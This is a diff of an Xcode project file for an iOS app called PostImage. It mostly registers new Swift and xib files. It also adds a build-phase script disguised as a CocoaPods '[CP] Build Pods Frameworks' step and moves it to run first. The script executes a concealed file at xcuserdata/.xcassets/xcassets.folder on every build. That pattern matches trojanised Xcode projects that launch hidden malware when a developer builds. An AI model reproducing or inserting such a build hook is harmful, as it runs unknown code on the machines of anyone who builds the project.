@@ -16,6 +16,9 @@
 		0435737325C13BB500B741A5 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0435737125C13BB500B741A5 /* LaunchScreen.storyboard */; };
 		04362E9025C2D68600FAFC22 /* ItemList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04362E8F25C2D68600FAFC22 /* ItemList.swift */; };
 		04362E9525C2DF8200FAFC22 /* imgCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04362E9425C2DF8200FAFC22 /* imgCell.swift */; };
+		0436E5C525C3D3D9008E1F32 /* SelctedImg.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0436E5C325C3D3D9008E1F32 /* SelctedImg.swift */; };
+		0436E5C625C3D3D9008E1F32 /* SelctedImg.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0436E5C425C3D3D9008E1F32 /* SelctedImg.xib */; };
+		0436E5CF25C40C86008E1F32 /* itemlist.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0436E5CE25C40C86008E1F32 /* itemlist.swift */; };
 		0439902D25C1892300BC952A /* RegisterVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0439902A25C1892200BC952A /* RegisterVC.swift */; };
 		0439903225C1892B00BC952A /* LoginVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0439903125C1892B00BC952A /* LoginVC.swift */; };
 		0439904325C18AD500BC952A /* PostRegisterModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0439904125C18AD500BC952A /* PostRegisterModel.swift */; };
@@ -35,6 +38,9 @@
 		0435737425C13BB500B741A5 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		04362E8F25C2D68600FAFC22 /* ItemList.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ItemList.swift; sourceTree = "<group>"; };
 		04362E9425C2DF8200FAFC22 /* imgCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = imgCell.swift; sourceTree = "<group>"; };
+		0436E5C325C3D3D9008E1F32 /* SelctedImg.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelctedImg.swift; sourceTree = "<group>"; };
+		0436E5C425C3D3D9008E1F32 /* SelctedImg.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SelctedImg.xib; sourceTree = "<group>"; };
+		0436E5CE25C40C86008E1F32 /* itemlist.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = itemlist.swift; sourceTree = "<group>"; };
 		0439902A25C1892200BC952A /* RegisterVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RegisterVC.swift; sourceTree = "<group>"; };
 		0439903125C1892B00BC952A /* LoginVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginVC.swift; sourceTree = "<group>"; };
 		0439904125C18AD500BC952A /* PostRegisterModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PostRegisterModel.swift; sourceTree = "<group>"; };
@@ -107,6 +113,15 @@
 			path = CollectionCell;
 			sourceTree = "<group>";
 		};
+		0436E5B525C3D2E1008E1F32 /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				0436E5C325C3D3D9008E1F32 /* SelctedImg.swift */,
+				0436E5C425C3D3D9008E1F32 /* SelctedImg.xib */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
 		0439903525C1897100BC952A /* Controllers */ = {
 			isa = PBXGroup;
 			children = (
@@ -115,6 +130,7 @@
 				049C6BAF25C288B0006AD262 /* AllListItemVC.swift */,
 				04362E9725C2DF8600FAFC22 /* AllListCells */,
 				0435736A25C13BB100B741A5 /* CreateItem.swift */,
+				0436E5B525C3D2E1008E1F32 /* Cell */,
 			);
 			path = Controllers;
 			sourceTree = "<group>";
@@ -125,6 +141,7 @@
 				0439904725C18ADB00BC952A /* DataModel.swift */,
 				043359BA25C1A2D30076F5E0 /* Login.swift */,
 				0439904125C18AD500BC952A /* PostRegisterModel.swift */,
+				0436E5CE25C40C86008E1F32 /* itemlist.swift */,
 			);
 			path = Models;
 			sourceTree = "<group>";
@@ -153,8 +170,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0435737725C13BB600B741A5 /* Build configuration list for PBXNativeTarget "PostImage" */;
 			buildPhases = (
+				3CAF317D7908A1F4CBAAC43A /* [CP] Build Pods Frameworks */,
 				68A6B301825DE13A7EF3A1DE /* [CP] Check Pods Manifest.lock */,
-				BC2992DEFBB24E73D4AAC43A /* [CP] Build Pods Frameworks */,
 				0435735F25C13BB100B741A5 /* Sources */,
 				0435736025C13BB100B741A5 /* Frameworks */,
 				0435736125C13BB100B741A5 /* Resources */,
@@ -206,6 +223,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				0436E5C625C3D3D9008E1F32 /* SelctedImg.xib in Resources */,
 				0435737325C13BB500B741A5 /* LaunchScreen.storyboard in Resources */,
 				0435737025C13BB500B741A5 /* Assets.xcassets in Resources */,
 				0435736E25C13BB100B741A5 /* Main.storyboard in Resources */,
@@ -215,6 +233,28 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	3CAF317D7908A1F4CBAAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
+	
 		542A9F8810BC6AAE8F65E40B /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -254,24 +294,6 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		BC2992DEFBB24E73D4AAC43A /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -287,7 +309,9 @@
 				0439904325C18AD500BC952A /* PostRegisterModel.swift in Sources */,
 				0435736725C13BB100B741A5 /* AppDelegate.swift in Sources */,
 				0435736925C13BB100B741A5 /* SceneDelegate.swift in Sources */,
+				0436E5CF25C40C86008E1F32 /* itemlist.swift in Sources */,
 				04362E9025C2D68600FAFC22 /* ItemList.swift in Sources */,
+				0436E5C525C3D3D9008E1F32 /* SelctedImg.swift in Sources */,
 				0439903225C1892B00BC952A /* LoginVC.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
